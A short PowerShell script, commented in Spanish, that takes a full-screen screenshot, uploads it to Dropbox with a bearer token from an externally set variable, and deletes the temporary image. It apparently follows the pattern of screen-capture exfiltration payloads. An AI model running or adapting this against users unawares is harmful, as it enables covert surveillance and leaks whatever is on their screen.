# Función para subir un archivo a Dropbox con manejo de errores
function DropBox-Upload {
    param (
        [string]$SourceFilePath
    )
    
    # Verificar que el archivo existe
    if (-not (Test-Path $SourceFilePath)) {
        Write-Host "El archivo $SourceFilePath no existe." -ForegroundColor Red
        return
    }
    
    try {
        # Preparar la ruta y los parámetros para la API de Dropbox
        $outputFile = Split-Path $SourceFilePath -leaf
        $TargetFilePath = "/$outputFile"
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $db
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        
        # Subir el archivo a Dropbox
        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
        Write-Host "Archivo subido exitosamente a Dropbox: $outputFile" -ForegroundColor Green
    } catch {
        Write-Host "Error al subir el archivo a Dropbox: $_" -ForegroundColor Red
    }
}

# Función para tomar una captura de pantalla
function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    
    # Guardar la captura de pantalla en un archivo temporal
    $filePath = "$env:temp\sc.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    return $filePath
}

# Captura de pantalla y subida a Dropbox
$filePath = Take-Screenshot

# Verificar si el token está definido
if (-not [string]::IsNullOrEmpty($db)) {
    DropBox-Upload -SourceFilePath $filePath
} else {
    Write-Host "El token de Dropbox no está definido. No se puede subir el archivo." -ForegroundColor Red
}

# Eliminar el archivo temporal después de la subida
if (Test-Path $filePath) {
    Remove-Item -Path $filePath -Force
    Write-Host "Archivo temporal eliminado: $filePath" -ForegroundColor Yellow
}
